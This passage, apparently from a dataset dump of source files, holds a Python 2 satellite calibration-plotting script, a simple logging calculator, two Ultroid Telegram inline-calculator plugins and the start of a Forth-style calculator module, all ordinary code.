 for i in xrange(1, sds_len+1):\n        create_1year_hdf(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'],hfile)\n        \n#     \n#     create_1year_hdf(tmpfile1year,tmpfilelife,'cold_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'hot_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'earth_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'scan_prd',hfile)\n\n    hfile.close()\n    #return True\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_[PRT|INS_TEMP|...]\n    png_title = sat.upper() + '_' + ins.upper() + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%Y%m%d\") + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%H%M\") + '_TO_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d') \\\n                + '_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%H%M') \\\n                + '_' \\\n                + format(int(hour_span), '02d') + 'H_'\n\n    ret = draw_nochannel(tmphdf, png_title,begin_data[0]['ymdhms'].strftime(\"%Y%m%d\"),\\\n                       datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d'))\n\n    return True\n    \ndef draw_nochannel(tmphdf, png_title, begin_time, end_time):    \n    cmd = []\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_no_channel'])\n    for i in xrange(0, sds_len): \n        file_out = conf.plot_path + '/'+ png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        file_title = png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        ncl_name = conf.plot_path +'/' + sat.upper() +'_' + ins.upper() +'_'+ conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '_4SUB.ncl'\n        temp_log = conf.tmp_path + '/monitor.' + log_tag +'.' + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] +'.log'\n        temp_cmd = conf.ncl + \" 'sat=\\\"\" + sat.upper() + \"\\\"' \" \\\n            + \"'instrument=\\\"\" + ins.upper() + \"\\\"\" +'\\'' \\\n            + \" 'file_in=\\\"\" + tmphdf + \"\\\"' \" \\\n            + \" 'file_out=\\\"\" + file_out + \"\\\"' \" \\\n            + \" 'file_title=\\\"\" + file_title + \"\\\"' \" +  ncl_name \\\n            + ' > ' + temp_log + ' 2>&1'\n        print temp_cmd\n        cmd.append(temp_cmd)\n\n    #print cmd\n \n    timeuse_begin = time.time()\n    \n    for cmd_temp in cmd:\n        print cmd_temp\n        (status, output) = commands.getstatusoutput(cmd_temp)\n        common.debug(my_log, log_tag, str(status) + '`' + cmd_temp + '`' + output)\n\n#     pooltest = ThreadPool()\n#     ret = pooltest.map(commands.getstatusoutput, cmd )\n#     pooltest.close()\n#     pooltest.join()\n    \n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print timeuse\n\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_no_channel'])\n    for i in xrange(0, sds_len): \n        file_out = conf.plot_path + '/'+ png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.' + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] +'.log'\n        # check png.OK\n        if not common.check_file_exist(file_out + '.png', check_ok = True):\n            msg = 'ncl program error: output png file not exist.' + file_out\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n        \n        dest_path = '/hds/assimilation/fymonitor/DATA/IMG/NSMC/'+ sat.upper() + '/' + ins.upper() + '/' \\\n                  + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '/' \n        arch_path = dest_path + str(end_time[0:4]) + '/'\n        latest_path = dest_path + 'LATEST/' \n        try:\n            shutil.copyfile(file_out + '.png', arch_path + png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '.png')\n            common.empty_folder(latest_path)\n            common.mv_file(file_out + '.png', latest_path + png_title  + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '.png')\n            os.remove(file_out + '.png.OK')\n            os.remove(temp_log)\n        except:\n            msg = 'png created, but cp or mv to dest error'\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n\n    try:\n        print 'ssss'\n        #os.remove(tmphdf)\n        #os.remove(tmphdf + '.txt')\n    except OSError,e:\n        msg = 'clean tmp file error[' + str(e.args[0])+']: ' + e.args[1]  \n        print msg            \n        common.warn(my_log, log_tag, time_tag + msg)\n    \n    return True\n\n\ndef draw_obc(input):\n    #for test!!!!!\n#     if input != 'just_obc':\n#         return\n#     if input != 1:\n#         return\n    print input\n    if input == 'just_obc':\n        return draw_just_obc()\n    else:\n        return draw_one_channel(input)\n \ndef main():\n    global my_channel_table\n    global my_Calc_channel_table\n    global my_obc_table\n    global my_Calc_table\n    \n    common.wt_file(my_pidfile, str(pid))\n    common.info(my_log, log_tag, time_tag + 'program start')\n\n    # register signal function.\n    signal.signal(signal.SIGTERM, signal_handler)   \n    signal.signal(signal.SIGINT, signal_handler)      \n    \n    # check ps result, kill previous same program, avoiding hang.\n    # we do NOT grep --date=2014-04-27-18 for convenience.\n    cmd = conf.ps + ' -elf | ' + conf.grep + ' ' + conf.bin_path + ' | ' \\\n        + conf.grep + ' -v grep | ' + conf.grep + ' -v tail | ' + conf.grep \\\n        + ' -v bash | ' + conf.grep + ' ' + fname + ' | ' + conf.grep \\\n        + \" '\\-\\-sat=\" + sat + \"' | \" + conf.grep + \" '\\-\\-ins=\" + ins \\\n        + \"' | \" + conf.grep + \" '\\-\\-span=\" + hour_span + \"' | \" \\\n        + conf.awk + \" '{print $4}'\"\n    (status, value) = commands.getstatusoutput(cmd)\n    pid_list = value.split()\n    for one_pid in pid_list:\n        if int(one_pid) != pid:\n            msg = 'more then one prog find, kill old same prog[' + one_pid + ']'\n            common.err(my_log, log_tag, time_tag + msg)\n            cmd = conf.kill + ' -kill ' + one_pid\n            commands.getstatusoutput(cmd)\n    \n    #get the correct tables. we MUST get table name from INFO db, not show tables!!\n    \"\"\"\n    We MUST create fy3b-mwts table's info, for easy time search\n    also, there is a BUG... ...\n    \"\"\"\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])\n        cur.execute('show tables') # the result is already sorted by ascii.\n        all_tables = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        msg = 'Mysql Fatal Error[' + str(e.args[0])+']: '+e.args[1] \n        common.err(my_log, log_tag, time_tag + msg)\n        sys.exit(3)\n        \n    # ignore L1B table.\n    all_obc_table = [ x for x in all_tables if 'OBCXX_MS' in x[0] ]\n    \n    Calc_tag = 'OBCXX_MS_CALC'\n    Calc_channel_tag='OBCXX_MS_CALC_'\n    Calc_table = [ x for x in all_obc_table if Calc_tag in x[0]]\n    Calc_channel_table=[ x for x in Calc_table if Calc_channel_tag in x[0]]\n    Calc_table =[ x for x in Calc_table if Calc_channel_tag not in x[0]]\n    \n    channel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n    channel_table = [ x for x in all_obc_table if channel_tag in x[0]]\n    channel_table=list(set(channel_table).difference(set(Calc_table)).difference(set(Calc_channel_table)))\n    \n    obc_table = list(set(all_obc_table).difference(set(Calc_table)).difference(set(channel_table)).difference(set(Calc_channel_table))) #return in all_obc_table but no in channel_table\n    #print obc_table\n    #print \"-------------------------\"\n    #print Calc_table\n    #print \"-------------------------\"\n    #print channel_table\n    #print \"-------------------------\"\n    #print Calc_channel_table\n\n\n    for idx, one_table in enumerate(Calc_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n            \n    if len(my_Calc_table)<=0:\n        msg = time_tag + 'no table found for my_Calc_table data'\n        common.warn(my_log, log_tag, msg)\n        \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now() - timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n    \n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    Calc_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_Calc_table):\n                if ymd in one_table:\n                    Calc_table_3day.extend([one_table])\n   \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_Calc_table):\n            if ymd in one_table:\n                Calc_table_1month.extend([one_table])\n\n    \n#         sys.exit(4)\n    \n    for idx, one_table in enumerate(obc_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n        \n    if len(my_obc_table)<=0:\n        msg = time_tag + 'no table found for 2-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_obc_table = sorted(my_obc_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n    \n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_obc_table):\n                if ymd in one_table:\n                    obc_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_obc_table):\n                if ymd in one_table:\n                    obc_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_obc_table):\n            if ymd in one_table:\n                obc_table_1month.extend([one_table])\n\n### judge channel table\n######################################################################\n    \n    for idx, one_table in enumerate(channel_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n        \n       \n        \n    if len(my_channel_table)<=0:\n        msg = time_tag + 'no table found for 3-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_channel_table = sorted(my_channel_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n\n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    channel_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    channel_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_channel_table):\n            if ymd in one_table:\n                channel_table_1month.extend([one_table])\n                \n #####################################################################       \n        \n    for idx, one_table in enumerate(Calc_channel_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_Calc_channel_table = [].extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_Calc_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_Calc_channel_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break             \n                \n                \n                \n    if len(my_Calc_channel_table)<=0:\n        msg = time_tag + 'no table found for 3-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_Calc_channel_table = sorted(my_Calc_channel_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n\n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_Calc_channel_table):\n                if ymd in one_table:\n                    Calc_channel_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_Calc_channel_table):\n                if ymd in one_table:\n                    Calc_channel_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_Calc_channel_table):\n            if ymd in one_table:\n                Calc_channel_table_1month.extend([one_table])\n                \n                \n                \n                \n    \n                \n                \n\n######################################################################\n\n    #print obc_table_3day\n    #print channel_table_3day\n#     print channel_table_1month\n    \n    \n    #draw_obc('just_obc')\n    #for channel in range(1,ins_conf.channels+1):\n    #    draw_obc(channel)\n    \n    # create input for thread. 'just_obc' means draw 2-dim obc data\n    # and, 1...13 means draw 3-dim obc data for each channel\n    pool = Pool()\n    ret = pool.map(draw_obc, ['just_obc'] + range(1, ins_conf.channels + 1) )\n    pool.close()\n    pool.join() \n    if False in ret:\n        msg = 'FAILED`some png may NOT draw.`timeuse='\n    else:\n        msg = 'SUCC`program finish.`timeuse='\n    \n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print msg + timeuse\n    common.info(my_log, log_tag, time_tag + msg + timeuse)\n\nif __name__ == '__main__':\n    main()\n\n", "214": "# Keep track of users who use the calculator and what calculations they do in a file\n# i.e. have a file per user\n\nusername = input(\"Please enter your username: \")\nfilename = f'{username}.txt'\n# this interpolates the username stored variable with .txt to create a valid file\n\ncalcfile = open(filename, 'a+')\ncalcfile.write(\"Your calculations are:\\n\")\n\ndef add(num1, num2):\n    ans = str(round(float(num1) + num2, 2))\n    num1s = str(num1)\n    num2s = str(num2)\n    calc = [num1s, '+', num2s, '=', ans]\n    return ans, calc\n\ndef subtract(num1, num2):\n    ans = str(round(float(num1) - num2, 2))\n    num1s = str(num1)\n    num2s = str(num2)\n    calc = [num1s, '-', num2s, '=', ans]\n    return ans, calc\n\ndef multiply(num1, num2):\n    ans = str(round(float(num1) * num2, 2))\n    num1s = str(num1)\n    num2s = str(num2)\n    calc = [num1s, 'x', num2s, '=', ans]\n    return ans, calc\n\ndef divide(num1, num2):\n    ans = str(round(float(num1) / num2, 2))\n    num1s = str(num1)\n    num2s = str(num2)\n    calc = [num1s, chr(247), num2s, '=', ans]\n    return ans, calc\n\n# user inputs first number and operator\nnum1 = float(input(\"Input number: \"))\noperator = str\n\n# while loop if operator was not X\nisFirstRun = True\n\nwhile operator != 'X':\n    if isFirstRun:                          # Bool for the first run-through the while loop: first input of operator\n        operator = input(\"Input operator: \")\n        isFirstRun = False                  # Set this to be False so subsequent loops use the following input for operator\n    else:\n        operator = input(\"Another operator? (You may type X to exit):\").upper()\n\n    if operator == 'X':\n        print(\"Thank you for using this python calculator!\")    # If user inputs X the program ends\n        break\n    elif operator != '+' and operator != '-' and operator != '*' and operator != '/':  # check if user inputs non-operator\n        print(\"Sorry, you must input one of the following operators: +, -, *, / \")\n    else:\n        num2 = float(input(\"Input number: \"))  # user inputs second number\n        if num2 == 0 and operator == \"/\":\n            print(\"Sorry, you cannot divide by 0.\")  # divide by zero check\n        else:\n            if operator == \"+\":                          # otherwise go through valid operators using functions\n                ans, calc = add(num1, num2)\n            elif operator == \"-\":\n                ans, calc = subtract(num1, num2)\n            elif operator == \"*\":\n                ans, calc = multiply(num1, num2)\n            elif operator == \"/\":\n                ans, calc = divide(num1, num2)\n            else:\n                print(\"Sorry, something has gone wrong\")\n            calcstring = \" \".join(calc)         # make the calc list into a string using .join\n            print(calcstring)                   # print this for user to see full calculation\n            calc.append(\"\\n\")                   # add a new line to end of the calc list\n            calcfile.writelines(calc)           # write the calculation list to file\n            num1 = ans                          # reassign the num1 variable with the value from ans\nelse:\n    print(\"Thank you for using this python calculator!\")\n\n# Rounding for answer means subsequent calculations lose accuracy\n", "215": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "216": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "217": "#! /usr/bin/env python\n# -*- coding: UTF-8 -*-\nfrom __future__ import division,print_function,absolute_import,unicode_literals\nimport math\nimport decimal\nimport fractions\nimport re\nfrom collections import OrderedDict\nfrom TSF_Forth import *\n\ndef TSF_calc_Initwords(TSF_words):    #TSF_doc:\u96fb\u5353\u95a2\u9023\u306e\u30ef\u30fc\u30c9\u3092\u8ffd\u52a0\u3059\u308b(TSFAPI)\u3002\n    TSF_words[\"#TSF_brackets\"]=TSF_calc_brackets; TSF_words[\"#\u6570\u5f0f\u306b\u9023\u7d50\"]=TSF_calc_brackets\n    TSF_words[\"#TSF_calcFX\"]=TSF_calc_calcFX; TSF_words[\"#\u5206\u6570\u8a08\u7b97\"]=TSF_calc_calcFX\n    TSF_words[\"#TSF_calcFXQQ\"]=TSF_calc_calcFXQQ; TSF_words[\"#\u5206\u6570\u4e5d\u4e5d\"]=TSF_calc_calcFXQQ\n    TSF_words[\"#TSF_calcDC\"]=TSF_calc_calcDC; 